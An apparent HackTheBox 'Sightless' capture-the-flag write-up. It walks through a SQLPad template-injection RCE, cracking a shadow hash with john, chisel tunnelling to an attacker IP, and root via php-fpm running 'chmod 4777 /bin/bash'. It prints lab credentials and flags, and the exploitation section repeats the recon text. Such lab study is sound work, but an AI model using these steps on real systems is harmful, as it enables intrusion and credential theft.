---
sticker: lucide//eye-off
---
# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | FTP |
| 22 | SSH |
| 80 | |

Let's start with reconnaissance.

# RECONNAISSANCE
---

![Pasted image 20250107170937.png](../../IMAGES/Pasted%20image%2020250107170937.png)

`echo "10.10.11.32 sightless.htb" | sudo tee -a /etc/hosts 2>/dev/null`

![Pasted image 20250107171213.png](../../IMAGES/Pasted%20image%2020250107171213.png)

Now we can access the website, we have a `home`, `about`, `services` and a `contact us` part, if we go to the service part, we can see the following:

![Pasted image 20250107171349.png](../../IMAGES/Pasted%20image%2020250107171349.png)

We got a `sqlpad` service, if we click start now, we are redirected to `sqlpad.sightless.htb`, let's add this subdomain to `/etc/hosts` too:

![Pasted image 20250107171612.png](../../IMAGES/Pasted%20image%2020250107171612.png)

Now we find ourselves in a sqlpad panel, if we look further in the site, we find we are using sqlpad 6.10.0:

![Pasted image 20250107172243.png](../../IMAGES/Pasted%20image%2020250107172243.png)

Let's check the web and see if there's anything related to this version:

![Pasted image 20250107172334.png](../../IMAGES/Pasted%20image%2020250107172334.png)

Found `CVE-2022-0944` which talks about a Template injection leading to a RCE, I also found this [github exploit](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944) which works with bash:

![Pasted image 20250107182931.png](../../IMAGES/Pasted%20image%2020250107182931.png)


# EXPLOITATION
---

Now we find ourselves in a sqlpad panel, if we look further in the site, we find we are using sqlpad 6.10.0:

![Pasted image 20250107172243.png](../../IMAGES/Pasted%20image%2020250107172243.png)

Let's check the web and see if there's anything related to this version:

![Pasted image 20250107172334.png](../../IMAGES/Pasted%20image%2020250107172334.png)

Found `CVE-2022-0944` which talks about a Template injection leading to a RCE, I also found this [github exploit](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944) which works with bash:

![Pasted image 20250107182931.png](../../IMAGES/Pasted%20image%2020250107182931.png)

Let's [stabilize the shell](../../Commands/Shell%20Tricks/STABLE%20SHELL.md), we would think that we already beat the machine since we got root access but no, we are inside of a docker container, we need some sort of way to get into the real machine, that's when we find 2 users, Michael and node:

![Pasted image 20250107183525.png](../../IMAGES/Pasted%20image%2020250107183525.png)

![Pasted image 20250107183536.png](../../IMAGES/Pasted%20image%2020250107183536.png)


Since we already have root access in the docker container, let's read `/etc/shadow` and get the hash for michael user:

![Pasted image 20250107183633.png](../../IMAGES/Pasted%20image%2020250107183633.png)

```ad-note
Michael hash is: 

`$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/`

----
We need to crack this hash using john, let's do it:

`john hash -w=/usr/share/wordlist/rockyou.txt`

----
This will output: `insaneclownposse`


Let's log into ssh using those credentials:


`michael`:`insaneclownposse`
```



![Pasted image 20250107184751.png](../../IMAGES/Pasted%20image%2020250107184751.png)

Now we are inside of michael's account, we can read the user flag now:

```ad-note
user flag: `fa24b7668682e82a648c821ccf0d9526`
```

# Privilege escalation
---

Let's proceed with privesc.

We'll be using linpeas to show use some possible PE vectors:

![Pasted image 20250107185646.png](../../IMAGES/Pasted%20image%2020250107185646.png)

There is a weird connection made to the port `8080`, we need to investigate this, for this, we will use chisel as we need to resend the traffic back to our local machine:

```ad-hint

##### Doing a reverse proxy
---
1. `chisel server -p 9999 --reverse`
2. `chmod +x chisel`
3. `./chisel client 10.10.15.36:9999 R:8080:127.0.0.1:8080`


```

Now, let's visit the page:

![Pasted image 20250107192343.png](../../IMAGES/Pasted%20image%2020250107192343.png)

It's executing froxlor, in order to get the credentials, we'll be using the following exploit: [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/), this is basically a chrome remote debugger pentest, since the machine is running chrome actively, we can use this to exploit and access the credentials, once we've reproduce all the steps accordingly to the notes, we get the following credentials:

```ad-note

`admin`:`ForlorfroxAdmin`

```


Let's log into the panel:

![Pasted image 20250107193550.png](../../IMAGES/Pasted%20image%2020250107193550.png)

We got access to the panel, as seen, we have a php section, this has the following:

![Pasted image 20250107193639.png](../../IMAGES/Pasted%20image%2020250107193639.png)

We got `php-fpm`, we are able to execute php code, we can do the following:

```ad-note
1. Create new PHP version
2. `chmod 4777 /bin/bash`
3. Go to `/system/settings/php-fpm`, disable it and enable it again
4. Go to our terminal and perform `/bin/bash -p`
5. Get root shell
```


```ad-important
If we did all correctly, we are able to get root access:


This is the root flag:


Root: `1c4c6860beaa42a5b9b8e404fbcbf656`


```
